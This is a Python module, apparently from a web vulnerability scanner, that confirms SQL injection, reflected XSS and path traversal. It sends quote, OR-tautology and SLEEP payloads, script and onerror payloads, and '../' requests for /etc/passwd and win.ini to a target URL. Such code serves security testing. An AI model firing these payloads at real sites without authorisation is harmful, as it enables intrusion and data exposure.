import re
import time
import logging
from .analyzers import ContextAnalyzer

class AutomatedVerifier:
    """Automated verification mechanisms untuk confirm vulnerabilities"""
    
    def __init__(self, session):
        self.session = session
        
    def verify_sqli_with_multiple_techniques(self, url, param, params):
        results = {'error_based': False, 'boolean_based': False, 'time_based': False}
        test_params = params.copy()
        
        # Error-based
        for p in ["'", "\"", "' OR '1'='1"]:
            test_params[param] = p
            try:
                resp = self.session.get(url, params=test_params, timeout=10)
                if re.search(r"SQL syntax|mysql_fetch_array|PostgreSQL.*?ERROR|Microsoft OLE DB", resp.text, re.IGNORECASE):
                    results['error_based'] = True
                    break
            except: pass
        
        # Boolean-based
        try:
            test_params[param] = "' OR '1'='1"
            true_resp = self.session.get(url, params=test_params, timeout=10)
            test_params[param] = "' OR '1'='2"
            false_resp = self.session.get(url, params=test_params, timeout=10)
            if abs(len(true_resp.text) - len(false_resp.text)) > 50:
                results['boolean_based'] = True
        except: pass
        
        # Time-based
        start = time.time()
        test_params[param] = "' AND SLEEP(3)--"
        try:
            self.session.get(url, params=test_params, timeout=10)
            if time.time() - start > 3:
                results['time_based'] = True
        except: pass
        
        score = sum(1 for v in results.values() if v)
        return {'vulnerable': score >= 1, 'confidence': 0.5 + (score * 0.15), 'details': results}

    def verify_xss_with_multiple_vectors(self, url, param, params, method='get'):
        vectors = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
        confirmed = 0
        for v in vectors:
            test_params = params.copy()
            test_params[param] = v
            try:
                if method == 'post': resp = self.session.post(url, data=test_params, timeout=10)
                else: resp = self.session.get(url, params=test_params, timeout=10)
                if v in resp.text: confirmed += 1
            except: pass
        return {'vulnerable': confirmed > 0, 'confidence': 0.7 if confirmed > 0 else 0}

    def verify_lfi_with_multiple_files(self, url, param, params):
        files = ['/etc/passwd', 'C:\\windows\\win.ini']
        for f in files:
            test_params = params.copy()
            test_params[param] = f"../../../../../../{f}"
            try:
                resp = self.session.get(url, params=test_params, timeout=10)
                if 'root:x:' in resp.text or '[boot loader]' in resp.text:
                    return {'vulnerable': True, 'confidence': 0.95}
            except: pass
        return {'vulnerable': False, 'confidence': 0}
